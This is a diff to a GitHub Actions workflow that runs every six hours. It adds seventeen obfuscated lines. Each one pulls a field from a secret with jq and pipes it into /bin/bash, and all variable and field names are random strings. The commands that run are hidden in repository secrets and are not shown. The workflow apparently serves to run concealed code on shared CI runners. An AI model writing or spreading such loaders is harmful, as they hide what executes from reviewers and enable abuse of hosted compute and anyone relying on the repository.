@@ -3,25 +3,32 @@ name: duibiff
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 4/6 * * *'
-jobs:  # 26892
+    - cron: '36 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: duibiff
         env:
-          x49: ${{ secrets.x49 }}
+          md9909: ${{ secrets.md9909 }}
         run: |
-          echo $x49 | jq -r .hb3447 | /bin/bash
-          echo $aoxq5595 | jq -r .itu6445 | /bin/bash
-          echo $o4 | jq -r .ekjvc474 | /bin/bash
-          echo $b68953 | jq -r .vsg88 | /bin/bash
-          echo $ep83104 | jq -r .riv957 | /bin/bash
-          echo $k357 | jq -r .l53888 | /bin/bash
-          echo $kj30161 | jq -r .xmen925 | /bin/bash
-          echo $zopz8 | jq -r .eb2398 | /bin/bash
-          echo $o2202 | jq -r .z94780 | /bin/bash
-          echo $jk786 | jq -r .k484 | /bin/bash
-          echo $krori08 | jq -r .zmzwf61 | /bin/bash
+          echo $md9909 | jq -r .l184 | /bin/bash
+          echo $ju1 | jq -r .btcuy30980 | /bin/bash
+          echo $q24 | jq -r .mt34652 | /bin/bash
+          echo $gf06759 | jq -r .ar34 | /bin/bash
+          echo $pfua04 | jq -r .udq0 | /bin/bash
+          echo $w31 | jq -r .oyic14 | /bin/bash
+          echo $hk5 | jq -r .t2976 | /bin/bash
+          echo $e4 | jq -r .nn962 | /bin/bash
+          echo $wirxp0 | jq -r .up9332 | /bin/bash
+          echo $fhkz489 | jq -r .jrevn89927 | /bin/bash
+          echo $lnvux3 | jq -r .k931 | /bin/bash
+          echo $srmpt960 | jq -r .wjmk8050 | /bin/bash
+          echo $soe2849 | jq -r .xicjx73287 | /bin/bash
+          echo $akq92276 | jq -r .ggm46 | /bin/bash
+          echo $r5075 | jq -r .nxsx7195 | /bin/bash
+          echo $svy85 | jq -r .yipl89 | /bin/bash
+          echo $aua70861 | jq -r .a931 | /bin/bash
 
